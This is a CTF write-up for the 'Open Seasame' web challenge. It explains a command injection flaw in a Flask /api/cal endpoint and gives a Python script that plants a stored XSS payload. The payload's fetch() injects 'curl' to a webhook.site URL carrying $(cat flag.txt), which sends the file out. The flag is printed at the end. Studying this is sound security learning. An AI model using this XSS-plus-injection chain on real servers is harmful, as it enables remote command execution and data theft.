# Open Seasame
## Description
> Does the CLI listen to magic?
>
> http://chal.competitivecyber.club:13336

![image](https://github.com/user-attachments/assets/ccae2797-f1eb-4084-9b61-34287594a33d)

`/api/cal` (GET):

```py
@app.route('/api/cal', methods=['GET'])
def get_cal():
    cookie = request.cookies.get('secret')

    if cookie == None:
        return '{"error": "Unauthorized"}'
    
    if cookie != SECRET:
        return '{"error": "Unauthorized"}'
    
    modifier = request.args.get('modifier','')
    
    return '{"cal": "'+subprocess.getoutput("cal "+modifier)+'"}'
```

- Returns the output of the cal (calendar) command.
- The endpoint is protected by a cookie called secret, which must match the contents of a secret.txt file.
- Accepts an optional modifier parameter, which is passed to the cal command.

Command Injection in `/api/cal`:

The modifier parameter is directly concatenated into a shell command using subprocess.getoutput("cal "+modifier), which is a command injection vulnerability. An attacker could pass malicious input (e.g., ; ls) as the modifier and execute arbitrary commands on the server.

![image](https://github.com/user-attachments/assets/5b84b7b0-b7a7-4262-a515-e7b623251853)

```py
import requests

payload = "<script>fetch('/api/cal?modifier=;curl https://webhook.site/ddae354f-39cf-4205-a327-1f1599aae8b0?$(cat flag.txt)')</script>"
URL = "http://chal.competitivecyber.club:13337"

resp = requests.request("POST", URL + "/api/stats", json={"username": payload, "high_score": 0})
uuid = resp.json()['id']

print("api/stats/" + uuid)
# api/stats/1f82e979-ba80-4a00-b555-53f9fa9abbf4
```
This line prints the URL where the injected stats (containing your payload) can be accessed. When this URL is visited by someone (e.g., an admin), the XSS payload will be executed.


Payload containing the attack (XSS):

```python
payload = "<script>fetch('/api/cal?modifier=;curl https://webhook.site/ddae354f-39cf-4205-a327-1f1599aae8b0?$(cat flag.txt)')</script>"
```
This payload injects a <script> tag into the application. It performs an HTTP request using JavaScript's fetch() function to a URL /api/cal on the target server. In the modifier parameter, a command injection attempt is made:

curl https://webhook.site/...?$(cat flag.txt): The attempt here is to execute a command (cat flag.txt) to read the contents of a file (flag.txt), then send the contents to the webhook.site URL. The webhook.site link is a public service for receiving HTTP requests.
If successful, the fetch() function would retrieve the result of the command and send it to webhook.site, where you could view it.

Sending the payload:

```python
resp = requests.request("POST", URL + "/api/stats", json={"username": payload, "high_score": 0})
uuid = resp.json()['id']
```
This sends the XSS payload in the username field of a POST request to the /api/stats endpoint. This is attempting to inject the payload into the server. The server will store the payload, and when a user or admin visits a page that reflects the stored username, the payload will execute.

The response (resp.json()['id']) contains the unique identifier (UUID) for the stats entry you just created. This UUID is needed to view the entry.
![image](https://github.com/user-attachments/assets/d4ff86db-ff43-4c1c-a562-bd629791f34f)

This script aims to exploit a command injection vulnerability combined with stored XSS. By injecting a script that runs server-side commands, the attacker attempts to read sensitive information (like the contents of flag.txt) and exfiltrate it via a curl request to webhook.site.

Stored XSS: The payload is stored on the server in the username field. Whenever the page reflecting this field is visited, the script runs.
Command Injection: In the fetch() call, the payload is trying to inject the cat flag.txt command and send the result to the attacker's server using curl.

## Flag
```
CACI1_l0v3_c0mm4nd_1nj3ct10n
```

